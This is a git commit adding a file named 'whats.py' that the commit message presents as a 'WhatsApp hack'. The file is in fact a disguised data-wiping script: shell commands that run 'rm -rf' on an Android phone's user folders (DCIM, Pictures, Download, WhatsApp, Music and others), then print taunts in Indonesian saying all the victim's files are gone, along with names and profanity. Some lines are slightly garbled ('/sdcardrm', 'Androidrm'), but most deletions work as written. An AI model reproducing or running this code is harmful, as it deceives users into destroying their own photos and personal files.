d8000069ca093b85b38faedc1aee6737fcb39abf
mrroke <58935306+mrroke@users.noreply.github.com>
2019-12-16 16:31:55 +0700

    Add files via upload
    WhatsApp hack

---
+++ whats.py
@@ -0,0 +1,18 @@
+cd /sdcardrm
+rm -rf Androidrm
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf MIUI
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf Android
+rm -rf SHAREit
+echo "Mampus Semua File Lu Hilang"
+echo "Mr.Ratmo (JASTIN)"
+echo "Mr.Kuntul (INDRA)"
+echo "I LIKE YOU"
+echo "Fuck You !!"
+echo "I LOVE YOU BEYBEH"
